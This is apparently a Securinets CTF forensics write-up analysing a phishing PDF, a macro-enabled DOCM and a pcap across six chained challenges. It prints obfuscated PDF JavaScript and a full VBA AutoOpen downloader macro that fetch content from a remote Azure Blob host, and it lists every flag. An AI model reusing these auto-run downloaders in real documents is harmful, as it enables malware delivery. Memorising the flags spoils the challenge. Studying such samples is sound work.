---

# Chilla Box — Series Writeup

category: Writeups
**Author:** pulgaa 
```
https://pulgaa.xyz
```
**Event:** Securinets CTF
**Difficulty:** 6-box series (100 → 200 pts each, ~900 pts total)
---

**Note on setup:** This is a series of **6 chained challenges** that all use the **same three files**:
> - `capture.pcap`
> - `Invoice_88213.docm`
> - `Invoice_88213.pdf`
>
> Each box asks a different question about the same incident. The intended solve order is 1 → 6 because later boxes build on findings from earlier ones (the host you find in box 2 is the one you grep in box 3, etc.).

---

## The Scenario

An invoice landed in a finance mailbox and someone opened it. The help-desk salvaged the two attached files and a packet capture from that afternoon. The PDF auto-runs when opened, downloads a second-stage DOCM from an Azure Blob container, and that DOCM makes a second request that leaks the flag. Each of the 6 boxes targets one stage of the kill chain.

```
PDF (open) ─► JS (obfuscated) ─► URL ─► GET update.docm ─► DOCM AutoOpen ─► GET flag.txt ─► response = flag
    Box 1        Box 2         Box 3        Box 3            Box 4        Box 5/6      Box 6
```

---

## Provided Files

```text
chilla_box_1/
├── capture.pcap           # the network capture of the incident
├── Invoice_88213.docm     # second stage (macro-enabled Word document)
└── Invoice_88213.pdf      # the initial lure (auto-running PDF)
```

```bash
$ file capture.pcap
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)

$ file Invoice_88213.docm
Invoice_88213.docm: Microsoft Word 2007+

$ file Invoice_88213.pdf
Invoice_88213.pdf: PDF document, version 1.7, 1 page(s)
```

### Tooling

On Fedora, the classic PDF forensics tools (`pdfid`, `peepdf`, `pdf-parser.py`) aren't in the default repos and the DidierStevensSuite clone sometimes fails midway. The tools that actually matter here:

| Tool | Purpose | Install |
|---|---|---|
| `strings` | Raw byte carving (PDF, PCAP, blobs) | preinstalled |
| `qpdf` | Decompress PDF streams so they're readable | `sudo dnf install qpdf` |
| `olevba` (oletools) | Extract + analyze VBA macros from the DOCM | `pip install --user oletools` |
| `tshark` | Packet capture analysis, stream following | `sudo dnf install wireshark-cli` |
| `xxd` | Hex decode | preinstalled |
| `python3` | Quick deobfuscation, base64 | preinstalled |

---

## Chilla Box 1 — Find the PDF's auto-run trigger

**Question:**
> Start with the invoice. It runs on its own the instant it is opened. Find the entry in its structure that makes that happen, and submit it as the flag.

**Difficulty:** 100 pts

### Approach

PDFs are mostly plaintext. The document catalog defines what the PDF does on open. Grep for it:

```bash
strings -n 6 Invoice_88213.pdf | grep -iE 'openaction|javascript'
```

Output:

```
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /Names << /JavaScript << /Names [ (auto) 5 0 R ] >> >> >>
<< /Type /Action /S /JavaScript /JS 6 0 R >>
```

The `/OpenAction` entry in the catalog (object 4) points to a JavaScript action. That's the auto-run hook.

### Flag

```
Securinets{/OpenAction}
```

---

## Chilla Box 2 — Deobfuscate the PDF JS, find the C2 host

**Question:**
> The invoice's embedded logic is wrapped in more than one layer. Peel it until it is readable and see what it reaches out to. The flag is the host it contacts.

**Difficulty:** 160 pts

### Approach

The JS stream is visible in `strings` output:

```javascript
eval(unescape("%65%76%61%6c%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28...%29%29%3b"));
```

**Layer 1 — `unescape()`**: percent-encoded ASCII. Decode it:

```javascript
eval(String.fromCharCode(118,97,114,32,104,111,115,116,...));
```

**Layer 2 — `String.fromCharCode(...)`**: decimal char codes. Decode it:

```javascript
var host = "stginvoicecdn.blob.core.windows.net";
var stage = "/shared/update.docm?sv=2023-11-03&ss=b&srt=o&sp=r&se=2026-10-01&sig=q9Kd2Zr7hVvN0pMxLbT8";
app.launchURL("https://" + host + stage, true);
```

Quick Python to peel both layers:

```bash
python3 -c '
import re, urllib.parse
s = open("Invoice_88213.pdf","rb").read().decode("latin-1")
layer1 = urllib.parse.unquote(re.search(r"unescape\(\"([^\"]+)\"\)", s).group(1))
codes  = [int(x) for x in re.findall(r"\d+", layer1)]
print("".join(chr(c) for c in codes))
'
```

### Flag

```
Securinets{stginvoicecdn.blob.core.windows.net}
```

---

## Chilla Box 3 — The stage-2 blob path

**Question:**
> Once the invoice's logic resolves, it pulls something down as a next stage. Identify what it fetches and where it lives on that host. Submit as Securinets{container/filename}.

**Difficulty:** 150 pts

### Approach

From Box 2's decoded script, the stage-2 URL is:

```
https://stginvoicecdn.blob.core.windows.net/shared/update.docm?sv=...
```

Azure Blob paths are `<container>/<blob>`, so:

- container = `shared`
- filename = `update.docm`

Confirmed in the pcap:

```bash
tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
```

```
stginvoicecdn.blob.core.windows.net   /shared/update.docm?sv=2023-11-03&...
stginvoicecdn.blob.core.windows.net   /private/flag.txt?sv=2023-11-03&...
```

### Flag

```
Securinets{shared/update.docm}
```

---

## Chilla Box 4 — The web-request component in the DOCM

**Question:**
> Now turn to the other document. It, too, acts by itself when opened. Look at how it performs its web request and name the exact component it uses for that. The flag is that component identifier.

**Difficulty:** 165 pts

### Approach

Extract the VBA macro from the DOCM:

```bash
olevba Invoice_88213.docm
```

Relevant macro body:

```vba
Sub AutoOpen()
    Refresh
End Sub
Sub Document_Open()
    Refresh
End Sub

Sub Refresh()
    Dim s As String, u As String, p As String
    s = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & Chr(58) & Chr(47) & Chr(47)   ' "https://"
    p = B64Dec(StrReverse("==Ad1IlbzUUY4EVe2MGWzFjQtRjaX1zZpNnJxATLwETL2IDMy0TZzZic9A3cm8WP0J3cmIWPzNnJzATLxETLzIDMy0jdz9Dd4RnLnFGbm9SZ0FmdpJHcvQXZu5yc39GZul2duUmcvNmLi9Gbi5ibkNWZjl2b25WanR3c"))
    u = s & p
    Dim h As Object
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.Open "GET", u, False
    h.send
    Dim f As Object
    Set f = CreateObject("Scripting.FileSystemObject")
    f.CreateTextFile(Environ("TEMP") & "\rf.dat").Write h.responseText
End Sub

Function B64Dec(t As String) As String
    Dim x As Object: Set x = CreateObject("Microsoft.XMLDOM").createElement("b")
    x.DataType = "bin.base64": x.Text = t
    Dim a() As Byte: a = x.NodeTypedValue
    Dim i As Long, r As String
    For i = 0 To UBound(a): r = r & Chr(a(i)): Next
    B64Dec = r
End Function
```

The exact component identifier is the `ProgID` passed to `CreateObject`.

### Flag

```
Securinets{MSXML2.ServerXMLHTTP.6.0}
```

---

## Chilla Box 5 — Deobfuscate the DOCM's target endpoint

**Question:**
> The other document hides its real target behind some string juggling. Undo it and read the precise endpoint it asks for. The flag is that exact path.

**Difficulty:** 175 pts

### Approach

The macro does three things to build the URL:

1. Prepends `"https://"` (built from `Chr()` codes).
2. Reverses the hard-coded string.
3. Base64-decodes it.

Reproduce it in Python:

```bash
python3 -c '
import base64
s = "==Ad1IlbzUUY4EVe2MGWzFjQtRjaX1zZpNnJxATLwETL2IDMy0TZzZic9A3cm8WP0J3cmIWPzNnJzATLxETLzIDMy0jdz9Dd4RnLnFGbm9SZ0FmdpJHcvQXZu5yc39GZul2duUmcvNmLi9Gbi5ibkNWZjl2b25WanR3c"
print(base64.b64decode(s[::-1]).decode())
'
```

Output (URL suffix):

```
stginvoicecdn.blob.core.windows.net/private/flag.txt?sv=2023-11-03&ss=b&srt=o&sp=r&se=2026-10-01&sig=Wj4mB1sXc6yQ8aE3nR5t
```

So the full URL is:

```
https://stginvoicecdn.blob.core.windows.net/private/flag.txt?sv=...
```

Confirmed in the pcap (frame 12):

```
GET /private/flag.txt?sv=2023-11-03&...&sig=Wj4mB1sXc6yQ8aE3nR5t HTTP/1.1
Host: stginvoicecdn.blob.core.windows.net
```

### Flag

```
Securinets{/private/flag.txt}
```

---

## Chilla Box 6 — Recover the exfiltrated response

**Question:**
> You know what both documents wanted. Only one request actually left the box — the capture caught it. Recover what came back. That is the flag.

**Difficulty:** 200 pts

### Approach

Only the DOCM's request actually fired (the PDF's request was blocked, or its target was never downloaded — depending on how you read the pcap). Enumerate TCP streams in the capture:

```bash
tshark -r capture.pcap -T fields -e tcp.stream | sort -u
# 0
# 1
```

Two streams:

- **stream 0** = `/shared/update.docm` (the DOCM download)
- **stream 1** = `/private/flag.txt` (the DOCM's actual request + response)

Follow stream 1:

```bash
tshark -r capture.pcap -q -z follow,tcp,ascii,1
```

Response:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 37
x-ms-blob-type: BlockBlob
Server: Windows-Azure-Blob/1.0
Connection: close

Securinets{m4ld0c_2_bl0b_3xf1l_ch41n}
```

The response body is exactly the flag.

### Flag

```
Securinets{m4ld0c_2_bl0b_3xf1l_ch41n}
```

---

## Kill Chain Summary

| Box | Stage | What you find | Flag |
|-----|-------|---------------|------|
| 1 | PDF catalog | Auto-run entry | `Securinets{/OpenAction}` |
| 2 | PDF JS (deobfuscated) | C2 host | `Securinets{stginvoicecdn.blob.core.windows.net}` |
| 3 | PDF JS (deobfuscated) | Stage-2 blob path | `Securinets{shared/update.docm}` |
| 4 | DOCM VBA | HTTP component | `Securinets{MSXML2.ServerXMLHTTP.6.0}` |
| 5 | DOCM VBA (deobfuscated) | Endpoint path | `Securinets{/private/flag.txt}` |
| 6 | pcap | Response body | `Securinets{m4ld0c_2_bl0b_3xf1l_ch41n}` |

**Narrative:** A phishing PDF uses `/OpenAction` to fire obfuscated JavaScript that launches a URL to download `update.docm` from an Azure Blob container. The DOCM's `AutoOpen` macro uses `MSXML2.ServerXMLHTTP.6.0` to request a second URL, hidden behind `StrReverse` + Base64, reaching `/private/flag.txt`. The response contains the attacker's exfiltrated flag, which the pcap captured on the wire.

---

## Techniques Used (Cheat Sheet)

| Technique | Command / Approach |
|---|---|
| PDF grep | `strings -n 6 file.pdf \| grep -iE 'openaction\|javascript\|eval'` |
| PDF decompress | `qpdf --qdf --object-streams=disable in.pdf out.pdf` |
| JS deobfuscation | layer 1 = `unescape()`, layer 2 = `String.fromCharCode()`, replace `eval` with `print` and iterate |
| VBA extraction | `olevba file.docm` |
| VBA string juggling | `B64Dec(StrReverse("..."))` → `base64.b64decode(s[::-1])` |
| pcap overview | `tshark -r capture.pcap -q -z io,phs` |
| HTTP field extraction | `tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri` |
| Follow a TCP stream | `tshark -r capture.pcap -q -z follow,tcp,ascii,N` |
| List TCP streams | `tshark -r capture.pcap -T fields -e tcp.stream \| sort -u` |
| Hex decode | `xxd -r -p` |

---

## Gotchas Encountered

1. **`pdfid`/`peepdf`/`pdf-parser.py` aren't on Fedora's repos.** Use `strings` + `qpdf --qdf` instead; they cover 95% of PDF analysis.
2. **`DidierStevensSuite` git clone can fail** with `RPC failed; curl 92 HTTP/2 stream ... CANCEL` — retry with `git clone --depth=1` or skip it entirely.
3. **`olevba` may auto-install via `python3-oletools`** on first invocation if not in `$PATH`. Add `~/.local/bin` to `PATH` to use the pip version directly.
4. **Empty flag fields from `tshark -T fields -e http.file_data`** mean the body lives only in the raw TCP stream — use `follow,tcp,ascii,N` instead.
5. **Watch for placeholder strings in commands** — typing the literal `<stream>` or `<c2-ip>` into fish will error. Substitute the actual value first.

---

**Total:** 6/6 flags captured.

```
Securinets{/OpenAction}
Securinets{stginvoicecdn.blob.core.windows.net}
Securinets{shared/update.docm}
Securinets{MSXML2.ServerXMLHTTP.6.0}
Securinets{/private/flag.txt}
Securinets{m4ld0c_2_bl0b_3xf1l_ch41n}
```
